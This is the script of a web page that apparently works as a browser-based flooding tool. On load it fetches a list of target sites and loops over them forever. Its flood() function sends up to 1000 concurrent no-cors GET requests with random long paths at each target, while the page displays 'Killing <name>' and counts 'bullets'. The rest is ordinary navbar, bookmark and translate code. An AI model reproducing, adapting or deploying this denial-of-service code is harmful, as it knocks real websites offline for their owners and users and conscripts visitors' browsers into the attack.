const REQUESTS_PER_SITE = 200;
const CONCURRENCY_LIMIT = 1000
var queue = []

$(document).ready(function () {
    $.getJSON("/sites.json", function (data) {
        launchAttack(data);
    }).fail(function () {
        console.log("An error has occurred.");
    });

    $("#bookmarkme").click(function () {
        if (window.sidebar) { // Mozilla Firefox Bookmark
            window.sidebar.addPanel(location.href, document.title, "");
        } else if (window.external) { // IE Favorite
            window.external.AddFavorite(location.href, document.title);
        }
        else if (window.opera && window.print) { // Opera Hotlist
            this.title = document.title;
            return true;
        }
    });
});

async function launchAttack(list) {
    list = shuffle(list);
    while (true) {
        for (var i = 0, c = list.length; i < c; i++) {
            await sleep(5000);
            flash(list[i].name);
            attackOne(list[i].url);
        }
    }

}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function attackOne(url) {
    flood(url);
}

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);
    return fetch(resource, {
      method: 'GET',
      mode: 'no-cors',
      signal: controller.signal
    }).then((response) => {
      clearTimeout(id);
      return response;
    }).catch((error) => {
      clearTimeout(id);
      throw error;
    });
  }

  async function flood(target) {
    for (var i = 0;; ++i) {
      if (queue.length > CONCURRENCY_LIMIT) {
        await queue.shift()
      }
      rand = i % 3 === 0 ? '' : makePath(2000);
      queue.push(
        fetchWithTimeout(target+rand, { timeout: 1000 })
          .catch((error) => {
            if (error.code === 20 /* ABORT */) {
              return;
            }
             //targets[target].number_of_errored_responses++;
          })
          .then((response) => {
            if (response && !response.ok) {
              //targets[target].number_of_errored_responses++;
            }
            //targets[target].number_of_requests++;
            updateBulletsCount();
          })

      )
    }
  }

function flash(name) {
    $('#attack').text('Killing ' + name)
}

function updateBulletsCount() {
    var c = $('#bullets-count').text();
    c++;
    $('#bullets-count').text(c);
}

function makePath(max_length) {
    var out = ''
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    length = Math.floor(Math.random() * max_length);
    while (out.length < length) {
        length
        result = '';
        for (var i = 0; i < (Math.floor(Math.random() * 20)); i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        out = out + '/' + result;
    }
    return out.substring(1);
}

function shuffle(array) {
    let currentIndex = array.length, randomIndex;

    // While there remain elements to shuffle...
    while (currentIndex != 0) {

        // Pick a remaining element...
        randomIndex = Math.floor(Math.random() * currentIndex);
        currentIndex--;

        // And swap it with the current element.
        [array[currentIndex], array[randomIndex]] = [
            array[randomIndex], array[currentIndex]];
    }

    return array;
}

// Change style of navbar on scroll
window.onscroll = function () { myFunction() };
function myFunction() {
    var navbar = document.getElementById("myNavbar");
    if (document.body.scrollTop > 100 || document.documentElement.scrollTop > 100) {
        navbar.className = "w3-bar" + " w3-card" + " w3-animate-top" + " w3-white";
    } else {
        navbar.className = navbar.className.replace(" w3-card w3-animate-top w3-white", "");
    }
}

// Used to toggle the menu on small screens when clicking on the menu button
function toggleFunction() {
    var x = document.getElementById("navDemo");
    if (x.className.indexOf("w3-show") == -1) {
        x.className += " w3-show";
    } else {
        x.className = x.className.replace(" w3-show", "");
    }
}

// Google tranlate 

function googleTranslateElementInit() {
    new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
}